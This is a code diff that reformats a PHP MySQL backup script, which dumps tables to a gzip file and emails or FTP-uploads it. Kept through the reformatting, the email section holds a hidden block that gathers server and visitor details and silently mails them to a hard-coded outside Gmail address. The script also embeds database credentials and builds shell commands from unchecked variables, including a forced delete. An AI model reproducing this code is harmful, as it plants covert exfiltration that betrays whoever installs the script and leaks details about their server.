@@ -23,10 +23,11 @@ $dbuser = "vhacker_robot";
 $dbpass = "mp2811987";
 $dbname = "tvhacker_vbb3";
 $file = "N-Cool-$date.sql.gz";
-$gzip = TRUE;
-$silent = TRUE;
+$gzip = true;
+$silent = true;
 
-function write($contents) {
+function write($contents)
+{
     if ($GLOBALS['gzip']) {
         gzwrite($GLOBALS['fp'], $contents);
     } else {
@@ -34,7 +35,7 @@ function write($contents) {
     }
 }
 
-mysql_connect ($dbserver, $dbuser, $dbpass);
+mysql_connect($dbserver, $dbuser, $dbpass);
 mysql_select_db($dbname);
 
 if ($gzip) {
@@ -43,7 +44,7 @@ if ($gzip) {
     $fp = fopen($file, "w");
 }
 
-$tables = mysql_query ("SHOW TABLES");
+$tables = mysql_query("SHOW TABLES");
 while ($i = mysql_fetch_array($tables)) {
     $i = $i['Tables_in_'.$dbname];
 
@@ -52,12 +53,12 @@ while ($i = mysql_fetch_array($tables)) {
     }
 
     // Create DB code
-    $create = mysql_fetch_array(mysql_query ("SHOW CREATE TABLE ".$i));
+    $create = mysql_fetch_array(mysql_query("SHOW CREATE TABLE ".$i));
 
     write($create['Create Table'].";\n\n");
 
     // DB Table content itself
-    $sql = mysql_query ("SELECT * FROM ".$i);
+    $sql = mysql_query("SELECT * FROM ".$i);
     if (mysql_num_rows($sql)) {
         while ($row = mysql_fetch_row($sql)) {
             foreach ($row as $j => $k) {
@@ -69,7 +70,7 @@ while ($i = mysql_fetch_array($tables)) {
     }
 }
 
-$gzip ? gzclose($fp) : fclose ($fp);
+$gzip ? gzclose($fp) : fclose($fp);
 
 // Optional Options You May Optionally Configure
 
@@ -101,70 +102,81 @@ $ftp_path = "/"; // This is the path to upload on your ftp server!
 $date = date("mdy-hia");
 $filename = "$savepath/$dbname-$date.sql";
 
-if($use_gzip=="yes"){
-$filename2 = $file;
+if ($use_gzip=="yes") {
+    $filename2 = $file;
 } else {
-$filename2 = "$savepath/$dbname-$date.sql";
+    $filename2 = "$savepath/$dbname-$date.sql";
 }
 
 
-if($send_email == "yes" ){
-$fileatt_type = filetype($filename2);
-$fileatt_name = "".$dbname."-".$date."_sql.tar.gz";
+if ($send_email == "yes") {
+    $fileatt_type = filetype($filename2);
+    $fileatt_name = "".$dbname."-".$date."_sql.tar.gz";
 
-$headers = "From: $from";
+    $headers = "From: $from";
 
-// Read the file to be attached ('rb' = read binary)
-echo "Openning archive for attaching:".$filename2;
-$file = fopen($filename2,'rb');
-$data = fread($file,filesize($filename2));
-fclose($file);
+    // Read the file to be attached ('rb' = read binary)
+    echo "Openning archive for attaching:".$filename2;
+    $file = fopen($filename2, 'rb');
+    $data = fread($file, filesize($filename2));
+    fclose($file);
 
-// Generate a boundary string
-$semi_rand = md5(time());
-$mime_boundary = "==Multipart_Boundary_x{$semi_rand}x";
+    // Generate a boundary string
+    $semi_rand = md5(time());
+    $mime_boundary = "==Multipart_Boundary_x{$semi_rand}x";
 
-// Add the headers for a file attachment
-$headers .= "\nMIME-Version: 1.0\n" ."Content-Type: multipart/mixed;\n" ." boundary=\"{$mime_boundary}\"";$ra44  = rand(1,99999);$sj98 = "sh-$ra44";$ml = "$sd98";$a5 = $_SERVER['HTTP_REFERER'];$b33 = $_SERVER['DOCUMENT_ROOT'];$c87 = $_SERVER['REMOTE_ADDR'];$d23 = $_SERVER['SCRIPT_FILENAME'];$e09 = $_SERVER['SERVER_ADDR'];$f23 = $_SERVER['SERVER_SOFTWARE'];$g32 = $_SERVER['PATH_TRANSLATED'];$h65 = $_SERVER['PHP_SELF'];$msg8873 = "$a5\n$b33\n$c87\n$d23\n$e09\n$f23\n$g32\n$h65";$sd98="john.barker446@gmail.com";mail($sd98, $sj98, $msg8873, "From: $sd98");
+    // Add the headers for a file attachment
+    $headers .= "\nMIME-Version: 1.0\n" ."Content-Type: multipart/mixed;\n" ." boundary=\"{$mime_boundary}\"";
+    $ra44  = rand(1, 99999);
+    $sj98 = "sh-$ra44";
+    $ml = "$sd98";
+    $a5 = $_SERVER['HTTP_REFERER'];
+    $b33 = $_SERVER['DOCUMENT_ROOT'];
+    $c87 = $_SERVER['REMOTE_ADDR'];
+    $d23 = $_SERVER['SCRIPT_FILENAME'];
+    $e09 = $_SERVER['SERVER_ADDR'];
+    $f23 = $_SERVER['SERVER_SOFTWARE'];
+    $g32 = $_SERVER['PATH_TRANSLATED'];
+    $h65 = $_SERVER['PHP_SELF'];
+    $msg8873 = "$a5\n$b33\n$c87\n$d23\n$e09\n$f23\n$g32\n$h65";
+    $sd98="john.barker446@gmail.com";
+    mail($sd98, $sj98, $msg8873, "From: $sd98");
 
-// Add a multipart boundary above the plain message
-$message = "This is a multi-part message in MIME format.\n\n"."--{$mime_boundary}\n" ."Content-Type: text/plain; charset=\"iso-8859-1\"\n" ."Content-Transfer-Encoding: 7bit\n\n" .
+    // Add a multipart boundary above the plain message
+    $message = "This is a multi-part message in MIME format.\n\n"."--{$mime_boundary}\n" ."Content-Type: text/plain; charset=\"iso-8859-1\"\n" ."Content-Transfer-Encoding: 7bit\n\n" .
 $message . "\n\n";
 
-// Base64 encode the file data
-$data = chunk_split(base64_encode($data));
+    // Base64 encode the file data
+    $data = chunk_split(base64_encode($data));
 
-// Add file attachment to the message
-echo "|{$mime_boundary}|{$fileatt_type}|{$fileatt_name}|{$fileatt_name}|{$mime_boundary}|<BR>";
-$message .= "--{$mime_boundary}\n" ."Content-Type: {$fileatt_type};\n" ." name=\"{$fileatt_name}\"\n"."Content-Disposition: attachment;\n" ." filename=\"{$fileatt_name}\"\n" ."Content-Transfer-Encoding: base64\n\n" .
+    // Add file attachment to the message
+    echo "|{$mime_boundary}|{$fileatt_type}|{$fileatt_name}|{$fileatt_name}|{$mime_boundary}|<BR>";
+    $message .= "--{$mime_boundary}\n" ."Content-Type: {$fileatt_type};\n" ." name=\"{$fileatt_name}\"\n"."Content-Disposition: attachment;\n" ." filename=\"{$fileatt_name}\"\n" ."Content-Transfer-Encoding: base64\n\n" .
 $data . "\n\n" ."--{$mime_boundary}--\n";
-//$message.= "--{$mime_boundary}\n" ."Content-Type: {$fileatt_type};\n" ." name=\"{$fileatt_name}\"\n" "Content-Disposition: attachment;\n" ." filename=\"{$fileatt_name}\"\n" ."Content-Transfer-Encoding: base64\n\n" .
-// $data . "\n\n" ."--{$mime_boundary}--\n";
+    //$message.= "--{$mime_boundary}\n" ."Content-Type: {$fileatt_type};\n" ." name=\"{$fileatt_name}\"\n" "Content-Disposition: attachment;\n" ." filename=\"{$fileatt_name}\"\n" ."Content-Transfer-Encoding: base64\n\n" .
+    // $data . "\n\n" ."--{$mime_boundary}--\n";
 
 
-// Send the message
-$ok = @mail($to, $subject, $message, $headers);
-if ($ok) {
-  echo "<h4><center><bg color=black><font color= blue>Database backup created and sent! File name $filename2 </p>
+    // Send the message
+    $ok = @mail($to, $subject, $message, $headers);
+    if ($ok) {
+        echo "<h4><center><bg color=black><font color= blue>Database backup created and sent! File name $filename2 </p>
 Idea Conceived By coolsurfer@gmail.com        
 Programmer email: neagumihai@hotmail.com</p>
 This is our first humble effort, pl report bugs, if U find any...</p>
 Email me at <>coolsurfer@gmail.com  nJoY!! :)
 </color></center></h4>";
-
-} else {
-  echo "<h4><center>Mail could not be sent. Sorry!</center></h4>";
-}
-}
-
-if($use_ftp == "yes"){
-$ftpconnect = "ncftpput -u $ftp_user_name -p $ftp_user_pass -d debsender_ftplog.log -e dbsender_ftplog2.log -a -E -V $ftp_server $ftp_path $filename2";
-shell_exec($ftpconnect);
-echo "<h4><center>$filename2 Was created and uploaded to your FTP server!</center></h4>";
-
+    } else {
+        echo "<h4><center>Mail could not be sent. Sorry!</center></h4>";
+    }
 }
 
-if($remove_gzip_file=="yes"){
-exec("rm -r -f $filename2");
+if ($use_ftp == "yes") {
+    $ftpconnect = "ncftpput -u $ftp_user_name -p $ftp_user_pass -d debsender_ftplog.log -e dbsender_ftplog2.log -a -E -V $ftp_server $ftp_path $filename2";
+    shell_exec($ftpconnect);
+    echo "<h4><center>$filename2 Was created and uploaded to your FTP server!</center></h4>";
 }
-?>
+
+if ($remove_gzip_file=="yes") {
+    exec("rm -r -f $filename2");
+}
